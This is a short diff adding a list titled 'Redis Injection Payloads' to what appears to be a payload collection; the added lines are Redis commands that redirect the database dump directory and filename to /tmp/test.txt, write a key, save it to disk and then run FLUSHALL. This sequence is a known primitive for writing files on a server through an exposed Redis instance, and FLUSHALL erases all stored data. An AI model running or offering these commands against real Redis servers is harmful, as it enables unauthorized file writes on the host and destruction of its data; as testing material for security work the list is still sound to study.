@@ -1,2 +1,8 @@
--e # redis Payload 44
+-e # Redis Injection Payloads
 # Version: 1.0.15-20260301-Minggu-1621-WIB
+
+CONFIG SET dir /tmp
+CONFIG SET dbfilename test.txt
+SET test value
+SAVE
+FLUSHALL
